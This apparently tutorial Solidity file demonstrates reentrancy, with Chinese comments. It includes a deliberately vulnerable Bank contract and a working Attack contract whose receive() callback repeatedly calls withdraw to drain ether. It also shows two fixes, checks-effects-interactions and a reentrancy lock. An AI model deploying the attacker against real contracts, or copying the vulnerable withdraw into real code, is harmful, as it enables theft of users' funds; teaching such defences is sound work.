// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

contract Bank {
    mapping(address => uint) public balanceOf;

    //存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    //提取msg.sender的全部ether
    function withdraw() external {
        uint balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        //转账ether !!!可能激活恶意合约的fallback/receive函数，有重入风险
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; //Bank合约地址

    constructor(Bank _bank) {
        bank = _bank;
    }

    //回调函数，用于重入攻击Bank合约，反复调用目标的withdraw函数
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    //攻击函数，调用时 msg.value 设为 1
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

//利用 checks-effect-interaction防止重入攻击
contract GoodBank {
    mapping(address => uint) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        //检查-效果-交互模式（checks-effect-interaction）: 先更新余额变化，再发送ETH
        //重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面检查
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }
}

//利用 重入锁 防止重入攻击
contract ProtectedBank {
    mapping(address => uint) public balanceOf;
    uint private _status; //重入锁

    modifier nonReentrant() {
        //在第一次调用 nonReentrant 时，_status 将是0
        require(_status == 0, "ReentrancyGuard: reentrant call");
        //在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
        //调用结束，将 _status 恢复为 0
        _status = 0;
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
